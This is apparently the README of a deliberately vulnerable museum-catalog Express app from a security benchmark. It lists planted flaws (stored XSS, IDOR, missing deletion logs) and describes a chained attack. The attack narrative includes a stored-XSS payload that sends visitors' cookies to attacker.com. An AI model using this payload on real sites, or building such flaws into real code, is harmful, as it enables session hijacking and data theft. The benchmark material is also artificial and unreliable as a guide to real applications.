# Museum Collection Catalog

## Overview
A JavaScript Express application representing an art museum catalog where users can browse exhibits, write in the public visitor guestbook, and delete items from catalog archives.

## Business Domain
Arts & Museum Catalogs

## Tech Stack
- JavaScript (Node.js)
- Express
- SQLite (in-memory)

## Features
- User registration and login
- Browse museum collection list (Decoy: HTML title escaping)
- View individual exhibit details (vulnerable to IDOR in confidential notes)
- Write comments in public guestbook (vulnerable to Stored XSS)
- Delete artifacts from archive catalog (vulnerable to missing deletion logs)

## Security Benchmarking
The vulnerabilities in this application are intentional. Refer to [.vulns](file:///d:/work/secure-code-hunt/apps/javascript/app-38-museum-catalog/.vulns) for the complete list of vulnerability targets.

---

## Chained Vulnerability Scenario

### Chain: "Stored Guestbook XSS → Session Hijack IDOR Exfiltration"

An attacker uploads a Stored XSS comment to steal active session cookies of visiting curators, then queries private golden artifacts via the IDOR endpoint.

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | Guestbook comments are vulnerable to Stored XSS | High | A03 | `src/index.js` → `GET /api/guestbook` |
| 2 | Exhibit details are vulnerable to IDOR | Medium | A01 | `src/index.js` → `GET /api/exhibits/:id` |

**Attack narrative**:
1. The attacker submits a guestbook entry containing a malicious script: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`.
2. The curator admin reviews guestbook submissions at `/api/guestbook`.
3. The script executes in the curator's browser, transmitting their session cookie.
4. The attacker sets the hijacked cookie and queries `/api/exhibits/2`.
5. The server returns the private details of gold pharaonic crowns, achieving data exfiltration.

**Combined Impact**: `db_exfiltration` — Attacker hijacks admin sessions to download private museum records.

---

## API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| POST   | `/api/auth/register` | None | Register new customer account |
| POST   | `/api/auth/login` | None | Authenticate customer |
| POST   | `/api/auth/logout` | Session | Clear session |
| GET    | `/api/exhibits` | None | List museum collection (Decoy: HTML title escaping) |
| GET    | `/api/exhibits/:id` | Session | Get specific exhibit details (vulnerable to IDOR) |
| GET    | `/api/guestbook` | None | Read guestbook entries (vulnerable to Stored XSS) |
| POST   | `/api/guestbook` | None | Submit a guestbook entry |
| POST   | `/api/exhibits/:id/delete` | Session (Admin) | Delete catalog item (vulnerable to missing logs) |

## Running Locally

1. Install dependencies:
   ```bash
   npm install
   ```
2. Start the application:
   ```bash
   npm start
   ```
3. The server runs on port `8038`.

## Running via Docker

1. Build the image:
   ```bash
   docker build -t app-38-museum-catalog .
   ```
2. Run the container:
   ```bash
   docker run -p 8038:8038 app-38-museum-catalog
   ```
